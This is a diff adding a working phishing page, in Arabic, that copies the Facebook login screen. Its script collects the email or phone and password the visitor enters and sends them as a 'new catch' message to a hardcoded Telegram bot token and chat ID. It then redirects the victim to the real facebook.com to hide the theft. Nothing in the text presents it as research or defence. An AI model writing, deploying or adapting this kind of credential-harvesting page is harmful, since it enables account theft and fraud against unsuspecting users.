@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 350px; text-align: center; }
+        h1 { color: #1877f2; font-size: 32px; }
+        input { width: 90%; padding: 10px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; }
+        button { width: 96%; padding: 10px; background: #1877f2; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>facebook</h1>
+        <form id="f">
+            <input type="text" id="e" placeholder="الإيميل أو الهاتف" required>
+            <input type="password" id="p" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
+    <script>
+        const T = "8305859982:AAHJEqmmZ4-KuKbNQqao9qfqMLRiNsqTatA";
+        const C = "8058949028";
+
+        document.getElementById('f').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const m = `🚨 صيد جديد:\n👤 الإيميل: ${document.getElementById('e').value}\n🔑 الباسورد: ${document.getElementById('p').value}`;
+            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}`)
+            .then(() => { window.location.href = "https://www.facebook.com"; });
+        });
+    </script>
+</body>
+</html>
